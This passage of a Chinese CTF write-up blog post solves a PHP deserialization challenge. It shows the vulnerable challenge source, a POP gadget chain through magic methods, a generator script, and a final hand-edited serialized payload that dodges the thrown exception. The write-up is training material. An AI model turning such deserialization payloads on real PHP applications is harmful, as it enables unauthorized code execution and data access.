+<h1 id="CTFShow-卷王杯-easy-unserialize"><a href="#CTFShow-卷王杯-easy-unserialize" class="headerlink" title="CTFShow[卷王杯]easy unserialize"></a>CTFShow[卷王杯]easy unserialize</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@Author</span>: F10wers_13eiCheng</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@Date</span>:   2022-02-01 11:25:02</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@Last</span> Modified by:   F10wers_13eiCheng</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@Last</span> Modified time: 2022-02-07 15:08:18</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;./HappyYear.php&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">one</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$object</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">MeMeMe</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="title function_ invoke__">array_walk</span>(<span class="variable">$this</span>, function(<span class="variable">$fn</span>, <span class="variable">$prev</span>)&#123;</span><br><span class="line">            <span class="keyword">if</span> (<span class="variable">$fn</span>[<span class="number">0</span>] === <span class="string">&quot;Happy_func&quot;</span> &amp;&amp; <span class="variable">$prev</span> === <span class="string">&quot;year_parm&quot;</span>) &#123;</span><br><span class="line">                <span class="keyword">global</span> <span class="variable">$talk</span>;</span><br><span class="line">                <span class="keyword">echo</span> <span class="string">&quot;<span class="subst">$talk</span>&quot;</span>.<span class="string">&quot;&lt;/br&gt;&quot;</span>;</span><br><span class="line">                <span class="keyword">global</span> <span class="variable">$flag</span>;</span><br><span class="line">                <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        @<span class="variable language_">$this</span>-&gt;<span class="keyword">object</span>-&gt;<span class="title function_ invoke__">add</span>();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;<span class="keyword">object</span>-&gt;<span class="keyword">string</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">second</span> </span>&#123;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$filename</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">protected</span> <span class="function"><span class="keyword">function</span> <span class="title">addMe</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Wow you have sovled&quot;</span>.<span class="variable language_">$this</span>-&gt;filename;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__call</span>(<span class="params"><span class="variable">$func</span>, <span class="variable">$args</span></span>) </span>&#123;</span><br><span class="line">        <span class="title function_ invoke__">call_user_func</span>([<span class="variable">$this</span>, <span class="variable">$func</span>.<span class="string">&quot;Me&quot;</span>], <span class="variable">$args</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">third</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$string</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$string</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="keyword">string</span> = <span class="variable">$string</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span>(<span class="params"><span class="variable">$name</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$var</span> = <span class="variable language_">$this</span>-&gt;<span class="variable">$name</span>;</span><br><span class="line">        <span class="variable">$var</span>[<span class="variable">$name</span>]();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&quot;ctfshow&quot;</span>])) &#123;</span><br><span class="line">    <span class="variable">$a</span>=<span class="title function_ invoke__">unserialize</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;ctfshow&#x27;</span>]);</span><br><span class="line">    <span class="keyword">throw</span> <span class="keyword">new</span> <span class="built_in">Exception</span>(<span class="string">&quot;高一新生报道&quot;</span>);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>直接一眼答案法秒杀<code>one::__destruct-&gt;second::__call-&gt;second::__addMe()-&gt;one::__toString-&gt;third::__get-&gt;one::MeMeMe()</code>,按照常规逻辑就这么构造即可<br>但是他抛出了异常，我们根据上面的分析，让其滞空即可</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@Author</span>: F10wers_13eiCheng</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@Date</span>:   2022-02-01 11:25:02</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@Last</span> Modified by:   F10wers_13eiCheng</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@Last</span> Modified time: 2022-02-07 15:08:18</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;./HappyYear.php&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">one</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$year_parm</span>=<span class="keyword">array</span>(<span class="string">&quot;Happy_func&quot;</span>);</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$object</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">MeMeMe</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="title function_ invoke__">array_walk</span>(<span class="variable">$this</span>, function(<span class="variable">$fn</span>, <span class="variable">$prev</span>)&#123;</span><br><span class="line">            <span class="keyword">if</span> (<span class="variable">$fn</span>[<span class="number">0</span>] === <span class="string">&quot;Happy_func&quot;</span> &amp;&amp; <span class="variable">$prev</span> === <span class="string">&quot;year_parm&quot;</span>) &#123;</span><br><span class="line">                <span class="keyword">global</span> <span class="variable">$talk</span>;</span><br><span class="line">                <span class="keyword">echo</span> <span class="string">&quot;<span class="subst">$talk</span>&quot;</span>.<span class="string">&quot;&lt;/br&gt;&quot;</span>;</span><br><span class="line">                <span class="keyword">global</span> <span class="variable">$flag</span>;</span><br><span class="line">                <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        @<span class="variable language_">$this</span>-&gt;<span class="keyword">object</span>-&gt;<span class="title function_ invoke__">add</span>();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;<span class="keyword">object</span>-&gt;<span class="keyword">string</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">second</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$filename</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">protected</span> <span class="function"><span class="keyword">function</span> <span class="title">addMe</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Wow you have sovled&quot;</span>.<span class="variable language_">$this</span>-&gt;filename;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__call</span>(<span class="params"><span class="variable">$func</span>, <span class="variable">$args</span></span>) </span>&#123;</span><br><span class="line">        <span class="title function_ invoke__">call_user_func</span>([<span class="variable">$this</span>, <span class="variable">$func</span>.<span class="string">&quot;Me&quot;</span>], <span class="variable">$args</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">third</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$string</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$string</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="keyword">string</span> = <span class="variable">$string</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span>(<span class="params"><span class="variable">$name</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$var</span> = <span class="variable language_">$this</span>-&gt;<span class="variable">$name</span>;</span><br><span class="line">        <span class="variable">$var</span>[<span class="variable">$name</span>]();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span>=<span class="keyword">new</span> <span class="title function_ invoke__">one</span>();</span><br><span class="line"><span class="variable">$a</span>-&gt;<span class="keyword">object</span>=<span class="keyword">new</span> <span class="title function_ invoke__">second</span>();</span><br><span class="line"><span class="variable">$a</span>-&gt;<span class="keyword">object</span>-&gt;filename=<span class="keyword">new</span> <span class="title function_ invoke__">one</span>();</span><br><span class="line"><span class="variable">$a</span>-&gt;<span class="keyword">object</span>-&gt;filename-&gt;<span class="keyword">object</span>=<span class="keyword">new</span> <span class="title function_ invoke__">third</span>(<span class="keyword">array</span>(<span class="string">&quot;string&quot;</span>=&gt;[<span class="keyword">new</span> <span class="title function_ invoke__">one</span>(),<span class="string">&quot;MeMeMe&quot;</span>]));</span><br><span class="line"><span class="variable">$b</span> = <span class="keyword">array</span>(<span class="variable">$a</span>,<span class="literal">NULL</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">urlencode</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$b</span>));</span><br></pre></td></tr></table></figure>
+<p>修改为:<code>a:2:&#123;i:0;O:3:&quot;one&quot;:2:&#123;s:9:&quot;year_parm&quot;;a:1:&#123;i:0;s:10:&quot;Happy_func&quot;;&#125;s:6:&quot;object&quot;;O:6:&quot;second&quot;:1:&#123;s:8:&quot;filename&quot;;O:3:&quot;one&quot;:2:&#123;s:9:&quot;year_parm&quot;;a:1:&#123;i:0;s:10:&quot;Happy_func&quot;;&#125;s:6:&quot;object&quot;;O:5:&quot;third&quot;:1:&#123;s:13:&quot;thirdstring&quot;;a:1:&#123;s:6:&quot;string&quot;;a:2:&#123;i:0;O:3:&quot;one&quot;:2:&#123;s:9:&quot;year_parm&quot;;a:1:&#123;i:0;s:10:&quot;Happy_func&quot;;&#125;s:6:&quot;object&quot;;N;&#125;i:1;s:6:&quot;MeMeMe&quot;;&#125;&#125;&#125;&#125;&#125;&#125;i:1;N;&#125;</code><br>最后URL编码打进去即可</p>
+<h1 id="NSSCTF-prize-p1"><a href="#NSSCTF-prize-p1" class="headerlink" title="[NSSCTF]prize_p1"></a>[NSSCTF]prize_p1</h1><p>一样的知识点，有兴趣去做就行<br>我懒，直接放链接给你们</p>
+
+    </div>
+
+    
+    <div class="about">
+        <h1>About this Post</h1>
+        <div class="details">
+            <p>This post is written by Boogipop, licensed under <a target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc/4.0">CC BY-NC 4.0</a>.</p>
+        </div>
+        
+        <p class="tags">
+            
+            <i class="icon"></i>
+            <a href="/tags/CTF/" class="tag">#CTF</a><a href="/tags/GC机制/" class="tag">#GC机制</a><a href="/tags/PHP/" class="tag">#PHP</a>
+        </p>
+        
+    </div>
+    
+
+    <div class="container post-prev-next">
+        
+        <a href="/2023/03/02/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E7%A0%94%E7%A9%B6/" class="next">
+            <div>
+                <div class="text">
+                    <p class="label">Next</p>
+                    <h3 class="title">Java反序列化研究</h3>
+                </div>
+            </div>
+        </a>
+        
+        
+        <a href="/2023/03/02/FilterChain%E6%94%BB%E5%87%BB%E8%A7%A3%E6%9E%90%E5%8F%8A%E5%88%A9%E7%94%A8/" class="prev">
+            <div>
+                <div class="text">
+                    <p class="label">Previous</p>
+                    <h3 class="title">FilterChain攻击解析及利用</>
+                </div>
+            </div>
+        </a>
+        
+    </div>
+
+    
+        
+        
+        <script src="https://giscus.app/client.js" data-repo="Boogipop/Boogipop.github.io" data-repo-id="R_kgDOIFi78g" data-category="Announcements" data-category-id="DIC_kwDOIFi78s4Cav9f" data-mapping="pathname" data-strict="1" data-reactions-enabled="1" data-emit-metadata="0" data-input-position="top" data-theme="preferred_color_scheme" data-lang="zh-CN" crossorigin="anonymous" async></script>
+        
+    
+</article>
+
+        <footer>
+    <div class="inner">
+        <div class="links">
+            
+            <div class="group">
+                <h2 class="title">Blog</h2>
+                
+                <a href="/" class="item">Blog</a>
+                
+                <a href="/archives" class="item">Archives</a>
+                
+                <a href="/tags" class="item">Tags</a>
+                
+                <a href="/categories" class="item">Categories</a>
+                
+                <a href="/search" class="item">Search</a>
+                
+                <a href="/friends" class="item">Friends</a>
+                
+                <a href="/about" class="item">About</a>
+                
+                <a href="/atom.xml" class="item">RSS</a>
+                
+            </div>
+            
+            <div class="group">
+                <h2 class="title">Projects</h2>
+                
+                <a target="_blank" rel="noopener" href="https://github.com/MrWillCom/rsa-cli" class="item">RSA CLI</a>
+                
+                <a target="_blank" rel="noopener" href="https://github.com/MrWillCom/hexo-theme-cupertino" class="item">Hexo Theme Cupertino</a>
+                
+                <a target="_blank" rel="noopener" href="https://github.com/MrWillCom/a-calendar" class="item">A Calendar</a>
+                
+                <a target="_blank" rel="noopener" href="https://github.com/MrWillCom/auto-mirroring-bucket" class="item">Auto Mirroring Bucket</a>
+                
+            </div>
+            
+            <div class="group">
+                <h2 class="title">Me</h2>
+                
+                <a target="_blank" rel="noopener" href="https://github.com/MrWillCom" class="item">GitHub</a>
+                
+                <a target="_blank" rel="noopener" href="https://codepen.io/mrwillcom" class="item">CodePen</a>
+                
+                <a target="_blank" rel="noopener" href="https://www.patreon.com/MrWillCom" class="item">Patreon</a>
+                
+                <a target="_blank" rel="noopener" href="https://noc.social/@MrWillCom" class="item">Mastodon</a>
+                
+                <a target="_blank" rel="noopener" href="https://discord.gg/UKuFDjcfY8" class="item">Discord</a>
+                
+                <a href="mailto:mr.will.com@outlook.com" class="item">Email</a>
+                
+            </div>
+            
+        </div>
+        <span>&copy; 2024 Boogipop<br>Powered by <a href="http://hexo.io/" target="_blank">Hexo</a> </span>
+        
+        
+            <br>
+            <div class="color-scheme-toggle" role="radiogroup" id="theme-color-scheme-toggle">
+                <label>
+                    <input type="radio" value="light">
+                    <span>Light</span>
+                </label>
+                <label>
+                    <input type="radio" value="dark">
+                    <span>Dark</span>
+                </label>
+                <label>
+                    <input type="radio" value="auto">
+                    <span>Auto</span>
+                </label>
+            </div>
+        
+    </div>
+</footer>
+
+
+        
+<script src="/js/main.js"></script>
+
+        
+        
+        
+
+        
+        <script src="https://unpkg.com/scrollreveal"></script>
+		
+        <script>
+            window.addEventListener('load', () => {
+                ScrollReveal({ delay: 250, reset: true, easing: 'cubic-bezier(0, 0, 0, 1)' })
+                ScrollReveal().reveal('.post-list-item .cover-img img')
+                ScrollReveal().reveal('.post-list-item, .card, .content p img, .content .block-large img', { distance: '60px', origin: 'bottom', duration: 800 })
+            })
+        </script>
+        
+    </body>
+</html>
